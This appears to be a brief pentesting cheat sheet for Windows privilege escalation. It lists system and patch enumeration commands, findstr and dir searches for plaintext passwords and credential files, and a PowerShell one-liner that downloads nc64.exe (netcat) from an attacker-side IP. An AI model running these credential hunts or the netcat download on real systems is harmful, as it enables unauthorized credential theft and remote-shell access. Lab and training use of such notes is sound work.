# Escalation
## Basics

```
whoami 
systeminfo 
net users 
net localgroups
net user user1 - more info about user
wmic qfe get Caption,Description,HotFixID,InstalledOn - gather how well system is patched
```

## Look for open credentials

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

## File download
```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe')
```
